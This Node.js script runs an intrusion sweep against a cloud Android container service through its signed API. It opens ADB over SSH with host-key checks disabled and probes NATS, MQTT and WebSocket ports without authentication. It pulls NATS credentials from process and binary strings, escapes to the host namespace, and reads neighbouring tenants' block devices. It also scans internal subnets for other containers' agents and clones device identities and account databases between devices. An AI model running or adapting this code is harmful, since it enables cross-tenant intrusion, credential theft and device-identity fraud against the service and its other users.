#!/usr/bin/env node
/**
 * FULL SWEEP — Follow-up: ADB retry, NATS MQTT/WS, D2 verify, deeper neighbor mining
 */

const path = require('path');
const https = require('https');
const crypto = require('crypto');
const fs = require('fs');
const { execSync, spawn } = require('child_process');

const { AK, SK, HOST, SVC, D1, D2, CT, SHD, sh, P } = require('../shared/vmos_api');
const OUT = path.join(__dirname, '..', 'output', 'full_sweep_results');

if (!fs.existsSync(OUT)) fs.mkdirSync(OUT, { recursive: true });
const save = (f, d) => fs.writeFileSync(`${OUT}/${f}`, typeof d === 'string' ? d : JSON.stringify(d, null, 2));
const R = {};

function sign(body) {
  const xd = new Date().toISOString().replace(/[-:]/g,'').replace(/\.\d{3}Z$/,'Z');
  const sd = xd.slice(0,8);
  const bh = crypto.createHash('sha256').update(body,'utf8').digest('hex');
  const can = [`host:${HOST}`,`x-date:${xd}`,`content-type:${CT}`,`signedHeaders:${SHD}`,`x-content-sha256:${bh}`].join('\n');
  const ch = crypto.createHash('sha256').update(can,'utf8').digest('hex');
  const sts = ['HMAC-SHA256',xd,`${sd}/${SVC}/request`,ch].join('\n');
  let k = crypto.createHmac('sha256',SK).update(sd).digest();
  k = crypto.createHmac('sha256',k).update(SVC).digest();
  k = crypto.createHmac('sha256',k).update('request').digest();
  return {'content-type':CT,'x-date':xd,'x-host':HOST,'authorization':`HMAC-SHA256 Credential=${AK}, SignedHeaders=${SHD}, Signature=${crypto.createHmac('sha256',k).update(sts).digest('hex')}`};
}

function post(ep, data, timeout) {
  return new Promise(ok => {
    const b = JSON.stringify(data||{}); const h = sign(b); const buf = Buffer.from(b);
    const req = https.request({hostname:HOST,path:ep,method:'POST',headers:{...h,'content-length':buf.length},timeout:(timeout||30)*1000,rejectUnauthorized:false},res=>{
      let d='';res.on('data',c=>d+=c);res.on('end',()=>{try{ok(JSON.parse(d));}catch{ok({code:-1,raw:d.slice(0,2000)});}});
    });
    req.on('timeout',()=>{req.destroy();ok({code:-99,msg:'timeout'});});
    req.on('error',e=>ok({code:-99,msg:e.message}));req.write(buf);req.end();
  });
}

// ══════════════════════════════════════════════════════════════════
// A: SSH-ADB TUNNEL WITH PROPER KEY
// ══════════════════════════════════════════════════════════════════
async function sshAdb() {
  console.log('\n' + '█'.repeat(75));
  console.log('  A: SSH-ADB TUNNEL SETUP');
  console.log('█'.repeat(75));

  // Get fresh ADB info
  P('[A1] Fresh ADB info...');
  const adb1 = await post('/vcpcloud/api/padApi/adb', {padCode:D1,enable:1});
  if (adb1.code !== 200) { P(`  D1 ADB failed: ${adb1.code}`); return; }
  const d = adb1.data;
  save('adb_fresh_d1.json', adb1);

  P(`  SSH command: ${d.command}`);
  P(`  ADB command: ${d.adb}`);
  P(`  SSH key (b64): ${d.key.slice(0,40)}...`);
  P(`  Expires: ${d.expireTime}`);

  // Parse SSH command
  const m = d.command.match(/ssh\s+.*?(\S+@\S+)\s+-p\s+(\d+)\s+-L\s+(\d+):([^:]+):(\d+)/);
  if (!m) { P('  Cannot parse SSH command'); return; }
  const [, userHost, sshPort, localPort, proxyHost, remotePort] = m;
  const [user, sshHost] = userHost.split('@');

  P(`  User: ${user}`);
  P(`  Host: ${sshHost}:${sshPort}`);
  P(`  Tunnel: localhost:${localPort} → ${proxyHost}:${remotePort}`);

  // Save SSH private key in proper PEM format
  const keyFile = `${OUT}/ssh_key_d1.pem`;
  // The key might be raw ed25519 or RSA — try writing as openssh format
  const keyB64 = d.key;
  const keyBuf = Buffer.from(keyB64, 'base64');
  P(`  Key size: ${keyBuf.length} bytes`);

  // Try multiple key formats
  const keyFormats = [
    // Format 1: Raw private key as PEM RSA
    `-----BEGIN RSA PRIVATE KEY-----\n${keyB64.match(/.{1,64}/g).join('\n')}\n-----END RSA PRIVATE KEY-----\n`,
    // Format 2: OpenSSH format
    `-----BEGIN OPENSSH PRIVATE KEY-----\n${keyB64.match(/.{1,70}/g).join('\n')}\n-----END OPENSSH PRIVATE KEY-----\n`,
    // Format 3: Try as ED25519
    `-----BEGIN PRIVATE KEY-----\n${keyB64.match(/.{1,64}/g).join('\n')}\n-----END PRIVATE KEY-----\n`,
  ];

  let sshConnected = false;
  for (let i = 0; i < keyFormats.length && !sshConnected; i++) {
    P(`\n  [A2] Trying key format ${i}...`);
    fs.writeFileSync(keyFile, keyFormats[i], {mode:0o600});
    
    try {
      const r = execSync(
        `ssh -v -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -oHostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -i ${keyFile} -p ${sshPort} -L ${localPort}:${proxyHost}:${remotePort} ${userHost} -Nf -o ConnectTimeout=10 2>&1`,
        {timeout:20000}
      ).toString();
      P(`    SSH output: ${r.slice(0,200)}`);
      sshConnected = true;
    } catch(e) {
      const msg = e.stderr ? e.stderr.toString() : e.message;
      P(`    Format ${i} err: ${msg.slice(0,150)}`);
    }
  }

  // Try without key (password might be the key)
  if (!sshConnected) {
    P('\n  [A3] Try sshpass with key as password...');
    try {
      execSync(`which sshpass`, {timeout:3000});
      const r = execSync(
        `sshpass -p "${keyB64}" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -oHostKeyAlgorithms=+ssh-rsa -p ${sshPort} -L ${localPort}:${proxyHost}:${remotePort} ${userHost} -Nf -o ConnectTimeout=10 2>&1`,
        {timeout:20000}
      ).toString();
      P(`    sshpass: ${r.slice(0,200)}`);
      sshConnected = true;
    } catch(e) {
      P(`    sshpass err: ${(e.stderr||e.message||'').toString().slice(0,100)}`);
    }
  }

  // Alternative: Check if ADB is already accessible on the device's network
  if (!sshConnected) {
    P('\n  [A4] Try direct ADB without SSH tunnel...');
    // From inside D1, check if ADB port is exposed
    const adbCheck = await sh(D1, [
      'echo "=== ADBD STATUS ==="',
      'getprop init.svc.adbd',
      'getprop service.adb.tcp.port',
      'getprop persist.adb.tcp.port',
      'echo "=== ADB LISTENERS ==="',
      'ss -tlnp | grep -E "5555|adbd"',
      'echo "=== ENABLE TCP ADB ==="',
      'setprop service.adb.tcp.port 5555',
      'stop adbd; sleep 1; start adbd',
      'sleep 1',
      'ss -tlnp | grep -E "5555|adbd"',
      'echo "=== IP ==="',
      'ip addr show | grep "inet " | grep -v 127.0.0.1',
    ].join('; '), 20);
    save('adb_tcp_enable.txt', adbCheck);
    P(`  ADB TCP check: ${adbCheck.slice(0,300)}`);
    R.adb_tcp = adbCheck;

    // Try connecting to device IP on 5555
    const ipMatch = adbCheck.match(/inet\s+([\d.]+)/);
    if (ipMatch) {
      P(`  Device IP: ${ipMatch[1]}`);
      try {
        const r = execSync(`adb connect ${ipMatch[1]}:5555 2>&1`, {timeout:10000}).toString();
        P(`  ADB connect ${ipMatch[1]}:5555: ${r.trim()}`);
        R.adb_direct = r.trim();
      } catch(e) { P(`  ADB direct err: ${e.message.slice(0,80)}`); }
    }
  }

  if (sshConnected) {
    // Test ADB shell
    P('\n  [A5] Testing ADB shell...');
    try {
      const r = execSync(`adb connect localhost:${localPort} 2>&1`, {timeout:10000}).toString();
      P(`  Connect: ${r.trim()}`);
      await new Promise(r=>setTimeout(r,2000));
      const shell = execSync(`adb -s localhost:${localPort} shell "id; getprop ro.product.model; df -h /data" 2>&1`, {timeout:10000}).toString();
      P(`  ★ ADB SHELL WORKS: ${shell.slice(0,200)}`);
      R.adb_shell = shell;
      R.adb_port = localPort;
    } catch(e) { P(`  ADB shell err: ${e.message.slice(0,100)}`); }
  }
}

// ══════════════════════════════════════════════════════════════════
// B: NATS MQTT + WEBSOCKET EXPLOITATION
// ══════════════════════════════════════════════════════════════════
async function natsMqttWs() {
  console.log('\n' + '█'.repeat(75));
  console.log('  B: NATS MQTT:1883 + WEBSOCKET:8080 EXPLOITATION');
  console.log('█'.repeat(75));

  // B1: MQTT probe
  P('[B1] MQTT port 1883 probe...');
  const mqttProbe = await sh(D1, [
    'echo "=== MQTT 1883 ==="',
    'echo "CONNECT" | nc -w3 192.168.200.51 1883 2>&1 | head -c 500 | xxd | head -10',
    'echo "=== MQTT 1883 HTTP ==="',
    'curl -s -m5 "http://192.168.200.51:1883/" 2>&1 | head -c 200',
    'echo "=== MQTT CLUSTER ==="',
    'for h in 192.168.200.51 192.168.200.52 192.168.200.53; do echo "$h:1883 $(nc -w2 -z $h 1883 2>&1 && echo OPEN || echo CLOSED)"; done',
  ].join('; '), 20);
  save('nats_mqtt_probe.txt', mqttProbe);
  P(`  MQTT: ${mqttProbe.slice(0,300)}`);

  // B2: WebSocket probe
  P('[B2] WebSocket port 8080 probe...');
  const wsProbe = await sh(D1, [
    'echo "=== WS 8080 ==="',
    'curl -s -m5 "http://192.168.200.51:8080/" 2>&1 | head -c 500',
    'echo "=== WS UPGRADE ==="',
    'curl -s -m5 -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" "http://192.168.200.51:8080/" -v 2>&1 | head -c 800',
    'echo "=== WS CLUSTER ==="',
    'for h in 192.168.200.51 192.168.200.52 192.168.200.53; do echo "$h:8080 $(nc -w2 -z $h 8080 2>&1 && echo OPEN || echo CLOSED)"; done',
  ].join('; '), 20);
  save('nats_ws_probe.txt', wsProbe);
  P(`  WebSocket: ${wsProbe.slice(0,300)}`);

  // B3: NATS cluster nodes
  P('[B3] NATS cluster nodes scan...');
  const clusterScan = await sh(D1, [
    'echo "=== ROUTEZ ==="',
    'curl -s -m5 "http://192.168.200.51:8222/routez" 2>/dev/null | head -c 1900',
  ].join('; '), 15);
  save('nats_routez.txt', clusterScan);
  P(`  Routez: ${clusterScan.slice(0,300)}`);

  // B4: Try NATS on alternate cluster nodes
  P('[B4] NATS monitoring on other cluster nodes...');
  for (const ip of ['192.168.200.52', '192.168.200.53']) {
    const r = await sh(D1, `curl -s -m5 "http://${ip}:8222/varz" 2>/dev/null | grep -oE '"server_name":"[^"]*"|"connections":[0-9]*' | head -5`, 10);
    P(`  ${ip}: ${r.slice(0,150)}`);
    save(`nats_${ip.split('.').pop()}_varz.txt`, r);
  }

  // B5: NATS gateway info (cross-cluster)
  P('[B5] NATS gatewayz...');
  const gatewayz = await sh(D1, 'curl -s -m5 "http://192.168.200.51:8222/gatewayz" 2>/dev/null | head -c 1900', 15);
  save('nats_gatewayz.txt', gatewayz);
  P(`  Gatewayz: ${gatewayz.slice(0,200)}`);

  // B6: NATS accounts info
  P('[B6] NATS accountz...');
  const accountz = await sh(D1, 'curl -s -m5 "http://192.168.200.51:8222/accountz" 2>/dev/null | head -c 1900', 15);
  save('nats_accountz.txt', accountz);
  P(`  Accountz: ${accountz.slice(0,200)}`);

  // B7: NATS subsz — subscription details
  P('[B7] NATS subsz...');
  const subsz = await sh(D1, 'curl -s -m5 "http://192.168.200.51:8222/subsz?subs=1&limit=20" 2>/dev/null | head -c 1900', 15);
  save('nats_subsz.txt', subsz);
  P(`  Subsz: ${subsz.slice(0,200)}`);

  // B8: Try NATS data port with extracted creds
  P('[B8] NATS data port 4222 auth test...');
  const natsAuth = await sh(D1, [
    'echo "=== CONNECT WITHOUT AUTH ==="',
    'echo -e "CONNECT {}\\r\\nPING\\r\\n" | nc -w3 192.168.200.51 4222 2>&1 | head -c 500',
    'echo "=== NATS INFO ==="',
    'echo "" | nc -w2 192.168.200.51 4222 2>&1 | head -c 500',
  ].join('; '), 15);
  save('nats_4222_auth.txt', natsAuth);
  P(`  NATS 4222: ${natsAuth.slice(0,300)}`);

  // B9: Extract NATS credentials from agent process memory/env
  P('[B9] Extract NATS credentials from agent...');
  const natsCreds = await sh(D1, [
    'echo "=== AGENT CMDLINE ==="',
    'cat /proc/413/cmdline 2>/dev/null | tr "\\0" " " | head -c 500',
    'echo ""',
    'echo "=== CONF.JSON FULL ==="',
    'cat /data/local/oicq/webrtc/conf/conf.json 2>/dev/null',
    'echo ""',
    'echo "=== NATS STRINGS IN BINARY ==="',
    'strings /data/local/oicq/webrtc/webrtc 2>/dev/null | grep -iE "nats|user|pass|token|auth|cred" | head -20',
    'echo "=== CG_DAEMON STRINGS ==="',
    'strings /data/local/oicq/cg_daemon/process_daemon 2>/dev/null | grep -iE "nats|user|pass|token|auth" | head -20',
  ].join('; '), 30);
  save('nats_creds_extract.txt', natsCreds);
  P(`  Creds: ${natsCreds.slice(0,400)}`);
}

// ══════════════════════════════════════════════════════════════════
// C: VERIFY D2 CLONE AFTER RESTART
// ══════════════════════════════════════════════════════════════════
async function verifyD2() {
  console.log('\n' + '█'.repeat(75));
  console.log('  C: VERIFY D2 CLONE + RETRY INJECTION');
  console.log('█'.repeat(75));

  // C1: Check D2 status
  P('[C1] Check D2 status...');
  const info = await post('/vcpcloud/api/padApi/padInfo', {padCode:D2});
  save('d2_verify_info.json', info);
  if (info.code === 200) {
    const d = info.data || {};
    P(`  D2: ${d.padType} Android=${d.androidVersion} Country=${d.country}`);
  }

  // C2: Check D2 props via API
  P('[C2] D2 properties after restart...');
  const props = await post('/vcpcloud/api/padApi/padProperties', {padCode:D2});
  save('d2_verify_props.json', props);
  if (props.code === 200) {
    const sys = props.data?.systemPropertiesList || [];
    const modem = props.data?.modemPropertiesList || [];
    P(`  System: ${sys.length} props, Modem: ${modem.length} props`);
    const model = sys.find(p=>p.propertiesName==='ro.product.model');
    const fp = sys.find(p=>p.propertiesName==='ro.build.fingerprint');
    const brand = sys.find(p=>p.propertiesName==='ro.product.brand');
    P(`  Model: ${model?.propertiesValue} Brand: ${brand?.propertiesValue}`);
    P(`  FP: ${fp?.propertiesValue}`);
    R.d2_model = model?.propertiesValue;
    R.d2_brand = brand?.propertiesValue;
    R.d2_fp = fp?.propertiesValue;
  }

  // C3: Shell verification on D2
  P('[C3] D2 shell verification...');
  const shellR = await sh(D2, [
    'echo "MODEL=$(getprop ro.product.model)"',
    'echo "BRAND=$(getprop ro.product.brand)"',
    'echo "FP=$(getprop ro.build.fingerprint)"',
    'echo "IMEI=$(getprop persist.sys.cloud.imeinum)"',
    'echo "PHONE=$(getprop persist.sys.cloud.phonenum)"',
    'echo "AID=$(settings get secure android_id 2>/dev/null)"',
    'echo "DRM=$(getprop persist.sys.cloud.drm.id)"',
    'echo "GPS_LAT=$(getprop persist.sys.cloud.gps.lat)"',
    'echo "GPS_LON=$(getprop persist.sys.cloud.gps.lon)"',
  ].join('; '), 15);
  save('d2_verify_shell.txt', shellR);
  P(`  D2 Shell:`);
  for (const l of shellR.split('\n')) P(`    ${l}`);
  R.d2_shell = shellR;

  // C4: If model didn't update, force via updatePadAndroidProp with restart
  if (R.d2_model && R.d2_model !== 'SM-S9280') {
    P('[C4] D2 still not Samsung — forcing prop update + restart...');
    
    // Read D1 props
    const d1Props = await post('/vcpcloud/api/padApi/padProperties', {padCode:D1});
    if (d1Props.code === 200) {
      const sysList = d1Props.data?.systemPropertiesList || [];
      const props = {};
      for (const p of sysList) {
        if (p.propertiesName && p.propertiesValue) props[p.propertiesName] = p.propertiesValue;
      }
      
      P(`  Sending ${Object.keys(props).length} props to D2...`);
      const r = await post('/vcpcloud/api/padApi/updatePadAndroidProp', {padCode:D2,props}, 30);
      P(`  Result: code=${r.code} msg=${r.msg||''}`);
      save('d2_force_props.json', r);

      if (r.code === 200) {
        P('  Waiting 20s for D2 restart...');
        await new Promise(r=>setTimeout(r,20000));
        
        // Re-verify
        const verify = await sh(D2, 'getprop ro.product.model; getprop ro.product.brand; getprop ro.build.fingerprint', 15);
        P(`  After restart: ${verify}`);
        save('d2_after_force.txt', verify);
        R.d2_after_force = verify;
      }
    }
  }

  // C5: Inject databases to D2 (retry if previously failed due to restart)
  P('[C5] Retry database injection to D2...');
  
  // Extract from D1 with chunking
  const dbPaths = [
    {name:'accounts_ce', path:'/data/system_ce/0/accounts_ce.db'},
    {name:'settings_secure', path:'/data/system/users/0/settings_secure.xml'},
    {name:'settings_global', path:'/data/system/users/0/settings_global.xml'},
    {name:'settings_system', path:'/data/system/users/0/settings_system.xml'},
  ];

  for (const db of dbPaths) {
    P(`  Extracting ${db.name}...`);
    const b64 = await sh(D1, `base64 ${db.path} 2>/dev/null`, 30);
    if (b64 && b64.length > 50 && !b64.startsWith('[')) {
      save(`d1_${db.name}.b64`, b64);
      
      // Inject to D2 via chunks
      const chunks = b64.match(/.{1,1500}/g) || [];
      if (chunks.length <= 1) {
        const inj = await sh(D2, `echo '${b64}' | base64 -d > ${db.path} 2>/dev/null && chmod 660 ${db.path} && echo OK || echo FAIL`, 20);
        P(`    ${db.name}: ${inj}`);
      } else {
        // Multi-chunk injection
        await sh(D2, `rm -f /tmp/_inject.b64`, 5);
        let ok = true;
        for (let c = 0; c < chunks.length && ok; c++) {
          const r = await sh(D2, `echo -n '${chunks[c]}' >> /tmp/_inject.b64 && echo OK`, 10);
          if (!r.includes('OK')) { ok = false; P(`    ${db.name} chunk ${c} failed`); }
        }
        if (ok) {
          const r = await sh(D2, `base64 -d /tmp/_inject.b64 > ${db.path} 2>/dev/null && chmod 660 ${db.path} && rm /tmp/_inject.b64 && echo OK`, 15);
          P(`    ${db.name}: ${r}`);
        }
      }
    } else {
      P(`    ${db.name}: extract failed (${b64.slice(0,50)})`);
    }
  }
}

// ══════════════════════════════════════════════════════════════════
// D: DEEPER NEIGHBOR MINING — MORE NATS ENDPOINTS
// ══════════════════════════════════════════════════════════════════
async function deeperNeighbors() {
  console.log('\n' + '█'.repeat(75));
  console.log('  D: DEEPER NEIGHBOR MINING');
  console.log('█'.repeat(75));

  // D1: Mine NATS connection details for IP addresses
  P('[D1] Mine NATS connection IPs...');
  const connIPs = await sh(D1, [
    'curl -s -m10 "http://192.168.200.51:8222/connz?limit=100&offset=0" 2>/dev/null | grep -oE "\"ip\":\"[^\"]*\"" | sort -u | head -50'
  ].join('; '), 15);
  save('nats_conn_ips.txt', connIPs);
  P(`  Connection IPs: ${connIPs.split('\n').length} unique`);
  for (const l of connIPs.split('\n').slice(0,10)) P(`    ${l}`);

  // D2: Try accessing neighbor containers from host namespace
  P('[D2] Host namespace /proc scan for containers...');
  const procScan = await sh(D1, [
    'echo "=== PROC SCAN ==="',
    'chroot /proc/1/root /system/bin/sh -c "ls /proc/ | grep -E \'[0-9]+\' | head -30" 2>/dev/null',
    'echo "=== CGROUP ==="',
    'cat /proc/1/cgroup 2>/dev/null',
    'echo "=== MOUNTS ==="',
    'cat /proc/1/mountinfo 2>/dev/null | grep dm- | head -10',
  ].join('; '), 15);
  save('host_proc_scan.txt', procScan);
  P(`  Proc: ${procScan.slice(0,300)}`);

  // D3: Scan all device-mapper volumes for other container data
  P('[D3] DM volume scanning...');
  const dmScan = await sh(D1, [
    'echo "=== ALL DM DEVICES ==="',
    'ls -la /dev/block/dm-* 2>/dev/null | head -20',
    'echo "=== DM-0 SUPERBLOCK ==="',
    'dd if=/dev/block/dm-0 bs=1024 skip=1 count=1 2>/dev/null | strings | head -10',
    'echo "=== DM-1 SUPERBLOCK ==="',
    'dd if=/dev/block/dm-1 bs=1024 skip=1 count=1 2>/dev/null | strings | head -10',
    'echo "=== DM-2 SUPERBLOCK ==="',
    'dd if=/dev/block/dm-2 bs=1024 skip=1 count=1 2>/dev/null | strings | head -10',
    'echo "=== LOOP DEVICES ==="',
    'losetup -a 2>/dev/null | head -20',
  ].join('; '), 20);
  save('dm_volume_scan.txt', dmScan);
  P(`  DM scan: ${dmScan.slice(0,400)}`);

  // D4: Try to read other container system images
  P('[D4] Read other container loop devices...');
  const loopScan = await sh(D1, [
    'echo "=== LOOP768 (root image) ==="',
    'strings /dev/block/loop768 2>/dev/null | grep -E "ro\\.product|ro\\.build" | sort -u | head -10',
    'echo "=== LOOP773 (data?) ==="',
    'dd if=/dev/block/loop773 bs=4096 count=1 2>/dev/null | strings | head -5',
    'echo "=== OUR ROOT IMAGE ==="',
    'ls -la /dev/block/dm-6 2>/dev/null',
    'echo "=== OTHER CONTAINERS DM ==="',
    'for i in $(seq 11 50); do f=/dev/block/dm-$i; test -e $f && echo "dm-$i: $(blockdev --getsize64 $f 2>/dev/null) bytes"; done | head -20',
  ].join('; '), 20);
  save('loop_scan.txt', loopScan);
  P(`  Loop: ${loopScan.slice(0,400)}`);

  // D5: Network scan for other containers
  P('[D5] Network scan for neighbor containers...');
  const netScan = await sh(D1, [
    'echo "=== ARP TABLE ==="',
    'cat /proc/net/arp 2>/dev/null',
    'echo "=== ROUTES ==="',
    'ip route show 2>/dev/null',
    'echo "=== PING GATEWAY ==="',
    'ping -c1 -W1 10.96.0.1 2>/dev/null | head -3',
    'echo "=== SCAN NEIGHBORS ==="',
    'for i in 1 2 3 170 171 172 173 174 175 176 177; do ip=10.96.0.$i; nc -w1 -z $ip 8779 2>/dev/null && echo "$ip:8779 OPEN" || true; done',
    'echo "=== SUBNET SCAN ==="',
    'for i in $(seq 1 10); do ip=10.96.0.$i; ping -c1 -W1 $ip 2>/dev/null | grep -q "1 received" && echo "$ip alive" || true; done',
  ].join('; '), 25);
  save('network_scan.txt', netScan);
  P(`  Net: ${netScan.slice(0,400)}`);

  // D6: Try all unique IPs from NATS
  P('[D6] Test NATS IPs for direct access...');
  const ips = (connIPs||'').match(/\d+\.\d+\.\d+\.\d+/g) || [];
  const uniqueIPs = [...new Set(ips)].slice(0,10);
  for (const ip of uniqueIPs) {
    const r = await sh(D1, `nc -w2 -z ${ip} 8779 2>&1 && echo OPEN || echo CLOSED`, 5);
    if (r.includes('OPEN')) {
      P(`  ★ ${ip}:8779 OPEN!`);
      // Try hitting agent API
      const agent = await sh(D1, `curl -s -m3 "http://${ip}:8779/api/v1/device/info" 2>/dev/null | head -c 500`, 8);
      P(`    Agent: ${agent.slice(0,100)}`);
      save(`neighbor_${ip.replace(/\./g,'_')}.txt`, agent);
    }
  }
}

// ══════════════════════════════════════════════════════════════════
// E: ANDROID 15 IMAGE DEEP ANALYSIS
// ══════════════════════════════════════════════════════════════════
async function imageAnalysis() {
  console.log('\n' + '█'.repeat(75));
  console.log('  E: ANDROID 15 IMAGE DEEP ANALYSIS');
  console.log('█'.repeat(75));

  // E1: System image structure
  P('[E1] Full system image structure...');
  const sysStruct = await sh(D1, [
    'echo "=== ROOT ==="',
    'ls -la / 2>/dev/null | head -25',
    'echo "=== SYSTEM ==="',
    'ls /system/ 2>/dev/null',
    'echo "=== VENDOR ==="',
    'ls /vendor/ 2>/dev/null | head -15',
    'echo "=== PRODUCT ==="',
    'ls /product/ 2>/dev/null | head -15',
  ].join('; '), 15);
  save('system_structure.txt', sysStruct);
  P(`  System: ${sysStruct.split('\n').length} lines`);

  // E2: Build.prop full contents
  P('[E2] Full build.prop...');
  const buildProp = await sh(D1, 'cat /system/build.prop 2>/dev/null | head -80', 20);
  save('build_prop_full.txt', buildProp);
  P(`  Build.prop: ${buildProp.split('\n').length} lines`);

  // E3: Image metadata from container
  P('[E3] Container image metadata...');
  const imgMeta = await sh(D1, [
    'echo "=== FSTAB ==="',
    'find / -name "fstab*" -maxdepth 3 2>/dev/null | head -5',
    'cat /vendor/etc/fstab.*.* 2>/dev/null | head -20',
    'echo "=== BOOTIMAGE ==="',
    'ls -la /dev/block/by-name/ 2>/dev/null | head -20',
    'echo "=== VBMETA ==="',
    'find / -name "vbmeta*" -maxdepth 3 2>/dev/null | head -5',
    'echo "=== INIT.RC ==="',
    'head -30 /init.rc 2>/dev/null',
  ].join('; '), 20);
  save('image_metadata.txt', imgMeta);
  P(`  Metadata: ${imgMeta.split('\n').length} lines`);

  // E4: Compare D1 and D2 system images
  P('[E4] D1 vs D2 system image comparison...');
  const d1Sys = await sh(D1, 'md5sum /system/build.prop /vendor/build.prop 2>/dev/null; ls -la /system/framework/*.jar 2>/dev/null | wc -l', 15);
  const d2Sys = await sh(D2, 'md5sum /system/build.prop /vendor/build.prop 2>/dev/null; ls -la /system/framework/*.jar 2>/dev/null | wc -l', 15);
  save('image_compare.txt', `D1:\n${d1Sys}\n\nD2:\n${d2Sys}`);
  P(`  D1: ${d1Sys.slice(0,100)}`);
  P(`  D2: ${d2Sys.slice(0,100)}`);

  // E5: How VMOS creates containers — analyze init system
  P('[E5] Container init system...');
  const initInfo = await sh(D1, [
    'echo "=== INIT SERVICES ==="',
    'getprop | grep init.svc | head -30',
    'echo "=== ZYGOTE ==="',
    'getprop | grep zygote',
    'echo "=== CLOUD PROPS ==="',
    'getprop | grep cloud | head -20',
    'echo "=== VMOS PROPS ==="',
    'getprop | grep -iE "vmos|vcluster|armcloud" | head -20',
  ].join('; '), 15);
  save('container_init.txt', initInfo);
  P(`  Init: ${initInfo.slice(0,300)}`);
}

// ══════════════════════════════════════════════════════════════════
// MAIN
// ══════════════════════════════════════════════════════════════════
async function main() {
  console.log('█'.repeat(75));
  console.log('  FULL SWEEP FOLLOW-UP');
  console.log('█'.repeat(75));

  await sshAdb();
  await natsMqttWs();
  await verifyD2();
  await deeperNeighbors();
  await imageAnalysis();

  save('FOLLOWUP_RESULTS.json', R);

  console.log('\n' + '█'.repeat(75));
  console.log('  FOLLOW-UP COMPLETE');
  console.log('█'.repeat(75));
  const files = fs.readdirSync(OUT).sort();
  console.log(`  Total files: ${files.length}`);
  for (const f of files.filter(n=>n.includes('RESULTS')||n.includes('verify')||n.includes('d2_')))
    console.log(`    ${f} (${fs.statSync(`${OUT}/${f}`).size}B)`);
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
